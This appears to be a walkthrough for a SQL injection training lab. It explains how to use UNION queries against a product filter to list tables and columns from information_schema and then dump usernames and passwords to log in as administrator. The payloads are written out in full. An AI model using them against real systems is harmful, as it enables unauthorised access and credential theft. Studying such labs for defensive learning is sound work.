# Lab-5 : SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. 

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

**Aim :-** To solve the lab, log in as the ``` administrator ``` user. 

## Solution
- Every non-Oracle DBMS contains an additional read-only database called **information_schema**, which is used to store metadata about the database structure (such as databases, tables, and columns).

- Use the payload ``` ' UNION SELECT table_name,null from information_schema.tables -- ``` to retrive all the **table names**.
    - ``` table_name ``` is the title of the column in ``` information_schema.tables ```
    - ``` null ``` is used to match the column numbers
    - The query retrive all the table names from ``` informations_schema.tables ```

- Get the users table name from the response

- To get the **column names** of the users table use the payload
 ``` ' UNION SELECT column_name,null from information_schema.columns where table_name = '<users-table-name>' -- ```
    - The ``` information_schema ``` databse contains a table named **columns**, it stores information about every column in every table of the database.
    - The above query returns all the columns name from the users table

- To get the usernames and passwords use the folowing payload
    ``` ' UNION SELECT <username-column>,<password-column> from <users-table-name> -- ```
